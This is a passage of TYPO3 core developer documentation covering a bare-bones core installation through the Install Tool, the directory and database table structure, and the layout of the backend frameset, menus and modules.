COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;extList&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">]&nbsp;=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'install'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$TYPO3_CONF_VARS</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">[</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;EXT&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">][</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;requiredExt&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">]&nbsp;=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">'lang'</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR><BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">&nbsp;&nbsp;&nbsp;&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#ff8000">// Setting up the database username, password and host<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_username&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;root&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_password&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;nuwr875&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">$typo_db_host&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">=&nbsp;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#dd0000">&quot;localhost&quot;</FONT></CODE><CODE CLASS="western"><FONT COLOR="#007700">;<BR></FONT></CODE><CODE CLASS="western"><FONT COLOR="#0000bb">?&gt;</FONT></CODE></PRE><P CLASS="western" STYLE="font-weight: normal">
<BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">The result will be
this:</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><IMG SRC="10_html_3c1323c7.png" NAME="Graphic7" ALIGN=LEFT WIDTH=297 HEIGHT=127 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">So we are connected to
the server (username and password accepted) but we have not yet
defined a database. Lets go create a blank one!</P>
<H3 CLASS="western"><A NAME="1.2.3.The Install Tool|outline"></A>The
Install Tool</H3>
<P CLASS="western">So we go to &quot;coreinstall/typo3/install/index.php&quot;
but see this message:</P>
<PRE CLASS="western">In the main source distribution of Typo3, the install script is disabled by a die() function call.<BR>Open the file typo3/install/index.php and remove/out-comment the line that outputs this message!</PRE><P CLASS="western" STYLE="font-weight: normal">
<BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">After having removed
the die() function call in the file .../install/index.php file we can
enter the Install Tool (password was &quot;joh316&quot; by default).
Then go to the &quot;Basic Configuration&quot; menu item.</P>
<H4 CLASS="western">Creating a database</H4>
<P CLASS="western">Go to the bottom of the page and enter a database
name:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_554031de.png" NAME="Graphic8" ALIGN=LEFT WIDTH=344 HEIGHT=199 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Creating required tables</H4>
<P CLASS="western">Then go to the &quot;Database Analyzer&quot;:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_12cf23d2.png" NAME="Graphic9" ALIGN=LEFT WIDTH=394 HEIGHT=136 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">OK, so we are connected, we have a database. But
zero tables. Kein problem:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5719be2d.png" NAME="Graphic10" ALIGN=LEFT WIDTH=373 HEIGHT=145 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">First &quot;Update required tables&quot; (Click #1
and click &quot;Write to database&quot;), 
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">then &quot;Dump static data&quot; (Click #2, tick
off &quot;Import the whole file...&quot; and &quot;Write to
database&quot;), then create an &quot;admin&quot; user so you can
login (Click #3, enter username/password and accept).</P>
<P CLASS="western"><I><B>Notice:</B></I><I> With a core-only install
of TYPO3 there is currently no static table data so this step can be
skipped. However it's included here for the completeness.</I></P>
<P CLASS="western">Now you can go to the typo3/ directory again and
you will have a login box:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">If you login you will
see this:</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><IMG SRC="10_html_m1b037aa3.png" NAME="Graphic15" ALIGN=LEFT WIDTH=669 HEIGHT=505 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Checking other requirements</H4>
<P CLASS="western">Finally we will revisit the &quot;Basic
Configuration&quot; menu item and check if the rest of the
requirements are met:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><IMG SRC="10_html_m6fe0b2e.png" NAME="Graphic14" ALIGN=LEFT WIDTH=413 HEIGHT=362 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">We find that this is
not the case with particularly two directories: uploads/ and
typo3temp/. There are a number of other missing directories which
issues a warning, but that is because those are typically used with
the &quot;cms&quot; extension frontend. That is disabled now.
Remember? - Core only!</P>
<P CLASS="western" STYLE="font-weight: normal">So 
</P>
<PRE CLASS="western"># mkdir typo3temp/
# mkdir uploads/
</PRE><P CLASS="western" STYLE="font-weight: normal">
... and all is fine.</P>
<H3 CLASS="western"><A NAME="1.2.4.Basic Core Installation Summary|outline"></A>
Basic Core Installation Summary</H3>
<P CLASS="western" STYLE="font-weight: normal">So lets sum up what we
have now:</P>
<H4 CLASS="western">File structure</H4>
<P CLASS="western"><SPAN STYLE="font-weight: normal">These are the
</SPAN>main directories of interest:</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=60*>
	<COL WIDTH=51*>
	<COL WIDTH=144*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=24%>
				<P CLASS="western">Directory</P>
			</TH>
			<TH COLSPAN=2 WIDTH=76%>
				<P CLASS="western">Content</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=24%>
				<P CLASS="western">t3lib/</P>
			</TD>
			<TD COLSPAN=2 WIDTH=76%>
				<P CLASS="western">TYPO3 libraries and core database setup
				(t3lib/stddb/)</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD ROWSPAN=5 WIDTH=24%>
				<P CLASS="western">typo3/</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>(shared between all websites)</I></P>
			</TD>
			<TD COLSPAN=2 WIDTH=76%>
				<P CLASS="western">Source code of the TYPO3 administration
				backend. Can be symlink'ed to the &quot;typo3_src&quot; source
				code located elsewhere. 
				</P>
				<P CLASS="western">Most directories can be write protected except
				as noted below</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western">ext/</P>
				<P CLASS="western">sysext/</P>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Directories containing extensions. 
				</P>
				<P CLASS="western">ext/ is for &quot;global&quot; extensions and
				sysext/ for &quot;system&quot; extensions. Both types are
				available for all installations sharing this source code. 
				</P>
				<P CLASS="western">The difference is that <I>global</I>
				extensions might be missing from the distributed source code
				(meant to be updated by the EM) while the <I>system</I>
				extensions are &quot;permanent&quot; and will always be a part of
				the distributed source. Further you cannot update the system
				extensions unless you set a certain configuration flag in
				TYPO3_CONF_VARS</P>
				<P CLASS="western"><B>NOTE: In case you want to allow the
				Extension Manager to update global and system extensions you must
				also allow writing to &quot;ext/&quot; and &quot;sysext/&quot;.
				Install Tool will warn you.</B></P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western">gfx/</P>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Various graphical elements</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western">install/</P>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Contains the Install Tool starter-script.
				Basically this is an index.php-script which initializes a
				constant that - if defined - will launch the Install Tool.</P>
				<P CLASS="western"><B>NOTE: Make sure to properly secure access
				to the Install Tool!</B></P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=20%>
				<P CLASS="western">mod/</P>
			</TD>
			<TD WIDTH=56%>
				<P CLASS="western">Backend modules. Reflects the old concept of
				modules and submodules from before extensions hit the scene in
				summer 2002. Today it contains mostly placeholders, &quot;host
				modules&quot; and default core modules like the Extension Manager
				(mod/tools/em).</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=24%>
				<P CLASS="western">typo3conf/</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>(specific for each website)</I></P>
			</TD>
			<TD COLSPAN=2 WIDTH=76%>
				<P CLASS="western">Local directory with configuration and local
				extensions. 
				</P>
				<P CLASS="western">Can be used for additional user defined
				purposes as you like.</P>
				<P CLASS="western">Must be writeable by PHP.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>localconf.php:</B> 
				</P>
				<P CLASS="western">Main configuration of the local TYPO3
				installation. Database username, password, install tool password
				etc.</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><B>temp_CACHED_xxxxxx_ext_localconf.php</B></P>
				<P CLASS="western"><B>temp_CACHED_xxxxxx_ext_tables.php:</B></P>
				<P CLASS="western">Auto-generated cache-files of
				&quot;ext_localconf.php&quot; and &quot;ext_tables.php&quot;
				files from all loaded extensions. Can be deleted at any time and
				will be automatically written again.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=24%>
				<P CLASS="western">typo3temp/</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>(specific for each website)</I></P>
			</TD>
			<TD COLSPAN=2 WIDTH=76%>
				<P CLASS="western">For temporary files.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=24%>
				<P CLASS="western">uploads/</P>
				<P CLASS="western"><BR>
				</P>
				<P CLASS="western"><I>(specific for each website)</I></P>
			</TD>
			<TD COLSPAN=2 WIDTH=76%>
				<P CLASS="western">For storage of files attached to database
				records as managed by the TCE. Strictly this directory (and
				subdirectories) is only needed if it's configured in $TCA.</P>
				<P CLASS="western">Also used by default for images inserted into
				the RTE.</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">Basically we completed
these steps to create the files and folders of a bare-bone TYPO3 core
installation:</P>
<UL>
	<LI><P CLASS="western" STYLE="font-weight: normal">Create symlink to
	the t3lib/ directory  <I>(shared)</I></P>
	<LI><P CLASS="western" STYLE="font-weight: normal">Create symlink to
	the backend administration directory, typo3/  <I>(shared)</I></P>
	<LI><P CLASS="western" STYLE="font-weight: normal">Create
	directories typo3conf/, uploads/, typo3temp/   <I>(specific)</I></P>
	<LI><P CLASS="western" STYLE="font-weight: normal">Create
	typo3conf/localconf.php file and add a minimum of configuration to
	get started.   <I>(specific)</I></P>
</UL>
<H5 CLASS="western">Notice on temp_CACHED-files in typo3conf/</H5>
<P CLASS="western" STYLE="font-weight: normal">There are two
(sometimes more) files which we didn't create ourselves; the cached
&quot;temp_CACHED_xxxxxx_ext_localconf.php&quot; and
&quot;temp_CACHED_xxxxxx_ext_tables.php&quot;. These two files are
automatically compiled from the currently loaded extensions and
written to disk. If you look into the files you can see that they are
just scripts automatically collected from the loaded extensions, then
concatenated and written to disk. This concept improves parsing <I>a
lot</I> since it make it possible to include one file (the cached
file) instead of maybe 50 files from different locations.</P>
<P CLASS="western"><B>WARNING:</B><SPAN STYLE="font-weight: normal">
If you install an extensions which has a parsing error in either the
&quot;ext_localconf.php&quot; file or &quot;ext_tables.php&quot; file
you will most likely be unable to use either frontend, backend or
Install Tool before this problem is fixed. You fix the problem by
using a shell or ftp to 1) edit localconf.php file, removing the
&quot;bad&quot; extension key from the list of installed extensions,
then 2) remove the cached files and 3) hit the browser again (cached
files will be rewritten, but without bad files). Of course the long
term solution is to fix the parsing error...</SPAN></P>
<H4 CLASS="western">typo3conf/localconf.php</H4>
<P CLASS="western">The file contained 
</P>
<OL>
	<LI><P CLASS="western">A password so we could enter the Install Tool</P>
	<LI><P CLASS="western">An extension list with only the &quot;install&quot;
	extension set (Install Tool). Normally there are a long list of
	default extensions listed.</P>
	<LI><P CLASS="western">A required extensions list set to only the
	&quot;lang&quot; extension (all the labels for the backend
	interface). (Required extensions cannot be disabled by the EM)</P>
	<LI><P CLASS="western">Database setup information, including the
	database name (added by Install Tool after database creation).</P>
</OL>
<H4 CLASS="western">Backend features</H4>
<P CLASS="western">Looking into the backend of our &quot;bare bone&quot;
install this is what we see:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><IMG SRC="10_html_m7d4e91ce.png" NAME="Graphic13" ALIGN=LEFT WIDTH=669 HEIGHT=331 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal">Notice how few modules
are available! <I>This</I> is the default set of features which
exists in what we call <I>the core</I> of TYPO3! If you go to the
Extension Manager (EM) and enable &quot;Shy extensions&quot; you can
see that only the &quot;lang&quot; and the &quot;install&quot;
extensions are there. Even the Install Tool is an extension that can
be disabled.</P>
<H4 CLASS="western">Database structure</H4>
<P CLASS="western">After these steps you have also created a database
and populated it with a default set of tables. So how did the Install
Tool know which tables were needed? Simple answer: The Install Tool
simply reads the core sql-file (t3lib/stddb/tables.sql) plus similar
files for every installed extension ([extension_dir]/ext_tables.sql)
and adds it all together into a requirement for the fields and keys
of the tables! Thus the database will always have the correct number
of tables with the correct number and types of fields!</P>
<P CLASS="western"><B>NOTICE:</B> You cannot necessarily pass these
sql-files directly to MySQL! If you look into the file
t3lib/stddb/tables.sql you can find a table definition like this:</P>
<PRE CLASS="western">#
# Table structure for table 'cache_hash'
#
CREATE TABLE cache_hash (
  hash varchar(32) DEFAULT '' NOT NULL,
  content mediumblob NOT NULL,
  tstamp int(11) unsigned DEFAULT '0' NOT NULL,
  ident varchar(20) DEFAULT '' NOT NULL,
  PRIMARY KEY (hash)
);</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">And in some extension (<I>myextension</I>) you
could find something along these lines:</P>
<PRE CLASS="western">#
# Table structure for table 'cache_hash'
#
CREATE TABLE cache_hash (
  tx_myextension_additionalfield varchar(20) DEFAULT '' NOT NULL,
);</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">The first &quot;CREATE TABLE&quot; query will
execute just fine if you &quot;pipe&quot; it into MySQL directly, but
the second one will not! And it was not intended to! 
</P>
<P CLASS="western">The reason is that IF <I>myextension</I><SPAN STYLE="font-style: normal">
is installed </SPAN>then the Install Tool will read both files and
<I>automatically</I> compile the final query into this:</P>
<PRE CLASS="western">CREATE TABLE cache_hash (
  hash varchar(32) DEFAULT '' NOT NULL,
  content mediumblob NOT NULL,
  tstamp int(11) unsigned DEFAULT '0' NOT NULL,
  ident varchar(20) DEFAULT '' NOT NULL,
  <B>tx_myextension_additionalfield varchar(20) DEFAULT '' NOT NULL,</B>
  PRIMARY KEY (hash)
);</PRE><P CLASS="western">
<BR><BR>
</P>
<P CLASS="western">If we install the &quot;phpmyadmin&quot; extension
we can browse the database tables from the backend:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_73a98375.png" NAME="Graphic17" ALIGN=LEFT WIDTH=574 HEIGHT=529 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">As we can see the number of required tables for a
minimum install of TYPO3 is really just 13 tables!</P>
<TABLE WIDTH=100% BORDER=1 BORDERCOLOR="#000000" CELLPADDING=4 CELLSPACING=0>
	<COL WIDTH=53*>
	<COL WIDTH=203*>
	<THEAD>
		<TR VALIGN=TOP>
			<TH WIDTH=21%>
				<P CLASS="western">Tablename</P>
			</TH>
			<TH WIDTH=79%>
				<P CLASS="western">Description</P>
			</TH>
		</TR>
	</THEAD>
	<TBODY>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">pages</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">The &quot;directory tree&quot; (page tree)
				backbone of TYPO3s database organization concept.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">be_groups</P>
				<P CLASS="western">be_users</P>
				<P CLASS="western">be_sessions</P>
				<P CLASS="western">sys_filemounts</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Tables with backend user groups and users plus
				a table for storing their login sessions.</P>
				<P CLASS="western">sys_filemounts are used to associate
				users/groups with filepaths where they can upload and manage
				files.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">cache_hash</P>
				<P CLASS="western">cache_imagesizes</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Multi purpose table for storing cached
				information (cache_hash) and cache table for image sizes of
				temporary files.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_be_shortcuts</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Stores the shortcuts users can create in
				various backend modules</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_history</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Contains the history/undo data</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_lockedrecords</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Keeps track of &quot;locked records&quot; -
				basically who is editing what at the moment.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_log</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">Backend log table - logs actions like file
				management, database management and login</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_language</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">System languages for use in records that are
				localized into certain languages.</P>
			</TD>
		</TR>
		<TR VALIGN=TOP>
			<TD WIDTH=21%>
				<P CLASS="western">sys_workspace</P>
			</TD>
			<TD WIDTH=79%>
				<P CLASS="western">System workspaces for editing of content in
				“offline” mode or in projects.</P>
			</TD>
		</TR>
	</TBODY>
</TABLE>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Even if you look at the &quot;pages&quot; you will
quickly see that the core pages table miss a lot of the fields and
features applied to it when used under &quot;CMS conditions&quot;.
All meta-fields are gone, all content management related fields are
gone. Left is only a set of general purpose options:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m693b39b2.png" NAME="Graphic18" ALIGN=LEFT WIDTH=416 HEIGHT=382 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western" STYLE="font-weight: normal"><BR><BR>
</P>
<H4 CLASS="western">The point?</H4>
<P CLASS="western">And the point is; TYPO3s inner identity is that of
a <I>framework</I> which <I>by additional extensions</I> can be
dressed up for the purpose it needs to fulfil. 99% of all people who
are using TYPO3 will see the &quot;dressed up version&quot; designed
for web content management. However my claim is that if you really
want to understand TYPO3 you must get down to the core, to the
principles which lay the foundation of it all. If you have a firm
grip on these central principles then you will quickly understand or
be able to analyze how each extension on top of it works. And you as
a developer will be able to help the continual development along
consistent lines of thought.</P>
<P CLASS="western">Welcome Inside of TYPO3!</P>
<P CLASS="western">- kasper</P>
<H1 CLASS="western" STYLE="page-break-before: always"><A NAME="2.Core Architecture|outline"></A>
</SPAN>Core Architecture</H1>
<H2 CLASS="western"><A NAME="2.1.Backend|outline"></A>Backend</H2>
<H4 CLASS="western">Backend interface</H4>
<P CLASS="western">The backend interface is (typically) found in the
typo3/ directory (constant TYPO3_mainDir). 
</P>
<P CLASS="western">Visually it is divided by a frameset into these
sections:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m38cc9ef7.png" NAME="Graphic19" ALIGN=LEFT WIDTH=669 HEIGHT=537 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<OL>
	<LI><P CLASS="western">alt_main.php: This script is redirected to
	after login from index.php. It will generate the frameset and
	include a minor set of JavaScript functions and variables which will
	be used by the other backend scripts with reference to the &quot;top&quot;
	JavaScript object. (JS reference: &quot;top&quot;)</P>
	<LI><P CLASS="western">alt_toplogo.php: Simply creates the logo in
	the upper left corner of the backend. (JS reference: &quot;top.toplogo&quot;)</P>
	<LI><P CLASS="western">alt_topmenu_dummy.php: By default it displays
	nothing. But when users click an icon of a file or database record
	and a context sensitive menu is displayed, then it is loaded into
	this frame. Then - depending on the capabilities of the client
	browser - the menu is either shown in this frame or the frame will
	remain blank and just write the menu content back to the calling
	frame where a DIV-layer will be created with the menu content
	dynamically. Depending on user configuration (User &gt; Setup:
	Select navigation mode = &quot;Icons in top frame&quot;) you might
	also see a list of menu icons in this bar as the default document
	(see below). (JS reference: &quot;top.topmenuFrame&quot;)</P>
	<LI><P CLASS="western">alt_menu.php: Displays the vertical menu of
	backend modules. (JS reference: &quot;top.menu&quot;)</P>
	<LI><P CLASS="western">alt_intro.php: By default the &quot;About
	modules&quot; content is shown here. However users might be shown
	the task center right away if they set that option in the User &gt;
	Setup screen (if the &quot;taskcenter&quot; extension is installed).
	Otherwise this frame will contain module scripts depending on
	selections in the menu of course. One special instance of this is
	&quot;Frameset modules&quot; like the Web and File main modules
	since they will display a frameset with a page/directory tree and a
	record/file list (see below). (JS reference: &quot;top.content&quot;)</P>
	<LI><P CLASS="western">alt_shortcut.php: This frame is <I>optionally</I>
	displayed depending on user configuration. For &quot;admin&quot;
	users it's always shown. For other users it must be specifically
	enabled (User TSconfig: &quot;options.shortcutFrame&quot;). (JS
	reference: &quot;top.shortcutFrame&quot;)</P>
</OL>
<P CLASS="western">Finally the backend can be configured for
&quot;condensed mode&quot; and there are also a few alternative
options for how the menu is displayed. 
</P>
<H4 CLASS="western">Alternative menu: Selectorbox</H4>
<P CLASS="western">One of those alternative options include having a
selector box shown in a third frame in the &quot;top-bar&quot;. That
frame will have the JavaScript reference &quot;top.menu&quot; in
substitute for the left menu and is made by the script
&quot;alt_menu_sel.php&quot;. 
</P>
<P CLASS="western">So setting the user profile like this...</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m3200688e.png" NAME="Graphic21" ALIGN=LEFT WIDTH=487 HEIGHT=35 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">... will yield this result for backend menu
navigation:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m697c13da.png" NAME="Graphic20" ALIGN=LEFT WIDTH=452 HEIGHT=238 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<OL>
	<LI><P CLASS="western">(alt_toplogo.php)</P>
	<LI><P CLASS="western">alt_menu_sel.php: Basically a simple document
	with a selectorbox. An &quot;onchange&quot; event is fired when an
	item is selected. The onchange-event will simply call the function
	&quot;top.goToModule('<I>module_name</I>')&quot; in order to change
	module - so in reality it's all handled in the main frameset as with
	the other types of menus which also call the function in the
	frameset.</P>
	<LI><P CLASS="western">(alt_topmenu_dummy.php)</P>
</OL>
<H4 CLASS="western">Alternative menu: Icons in top frame</H4>
<P CLASS="western">You can also have the menu as a list of icons in
the top frame. This obviously requires you to know the menu items by
heart so you can recognize the items on their icons only without the
descriptive labels:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m5a455dfe.png" NAME="Graphic22" ALIGN=LEFT WIDTH=448 HEIGHT=33 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">... and the menu will look like:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_eba7854.png" NAME="Graphic23" ALIGN=LEFT WIDTH=417 HEIGHT=158 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">Main- and sub modules</H4>
<P CLASS="western">Basically there are two types of modules, <I>main</I>
modules and <I>sub</I> modules. Normally we refer to them just as
&quot;modules&quot; or &quot;backend modules&quot;.</P>
<P CLASS="western">The term &quot;modules&quot; is used within TYPO3
specifically for these backend modules. For the frontend we might
also like to call a message board or guest book for &quot;a module&quot;.
However to distinguish between the two worlds we use another term,
&quot;plugins&quot;, for frontend applications such as message
boards, shops, guest books etc.</P>
<P CLASS="western">Modules are discussed in detail later in this
document. For now just observe the distinction between main- and
submodules:</P>
<P CLASS="western"><B>Main modules</B> are those on the &quot;first
level&quot; in the menu. Most of them are not linking directly to any
script but are merely &quot;headlines&quot; for the submodules under
them. One exception is the &quot;Doc&quot; module which <I>is</I>
linked to the alt_doc.php script.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_7aa76326.png" NAME="Graphic25" ALIGN=LEFT WIDTH=219 HEIGHT=269 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Sub modules</B> are those on the second level
in the menu. As such they <I>don't have to</I> have any technical
relationship with the main module. The main module might simply act
as a category for the module. However for &quot;Frameset modules&quot;
it's a little different (see next section). Sub-modules may be named
&quot;Web&gt;List&quot; or &quot;User&gt;Setup&quot; but we encourage
unambiguous naming of modules so any module can be referred to by its
own name only, eg. &quot;List module&quot; (Web&gt;<B>List</B>) or
&quot;Filelist module&quot; (File&gt;<B>Filelist</B>) - it turns out
to be much easier to say in words &quot;<I>The filelist module</I>&quot;
than &quot;<I>The File-Filelist module</I>&quot;.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m39ed672f.png" NAME="Graphic26" ALIGN=LEFT WIDTH=229 HEIGHT=320 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">Finally <B>&quot;Function menus&quot;</B> are what
you get when you create backend modules &quot;on the third level&quot;
- basically a module which inserts itself into a menu of an existing
main- or sub-module. This of course requires the host module to
supply an API for that, but that is in fact the case with both the
&quot;Info&quot; and &quot;Functions&quot; modules!</P>
<P CLASS="western">In this example the extension &quot;info_pagetsconfig&quot;
has been loaded in the EM (Extension Manager) and thus the Info
module will show this item in the menu:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_m316fc578.png" NAME="Graphic27" ALIGN=LEFT WIDTH=669 HEIGHT=145 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<H4 CLASS="western">Frameset Modules</H4>
<P CLASS="western">Main modules can be configured to load a frameset
into the content frame instead of the modules default script. This is
the case of the Web and File main modules. In itself that might sound
trivial but the point is that &quot;Frameset modules&quot; are more
than just a &quot;category&quot; for submodules - they are offering
additional features:</P>
<P CLASS="western">In the case of frameset modules the idea becomes
clear when you observe the usage; Both the Web and File main modules
offers a two-split window with a page/folder tree on the left and a
<I>sub-module</I> script loaded in the right frame. The point is that
a click in the left frame will load the sub-module script in the
right frame <I>with </I>an <I>&amp;id=</I> parameter! In the case of
the Web module this &quot;id&quot; is of course the page id, for the
File module it's the path to the directory that should be shown.</P>
<P CLASS="western">Still this could be achieved by a local frameset
made by the module itself, but the main point is that even if you
switch between the sub-modules in the menu the id-value is passed
along to the other sub-module and further will the id be restored and
sent to the script when a totally other module has been accessed in
the meantime and the user goes back to one of the sub-modules within
the frameset module. 
</P>
<P CLASS="western">For instance you might click the page &quot;A page
title&quot; below, the List module will show the records for that
page id, then you go the the Extension Manager and when you later
click on the List, Info, Access or Functions sub-module the last page
id displayed will be shown again.</P>
<P CLASS="western">That is what a Frameset module does. 
</P>
<P CLASS="western">(See the module section for details on how to
configure such a module)</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_13f3df27.png" NAME="Graphic24" ALIGN=LEFT WIDTH=669 HEIGHT=377 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
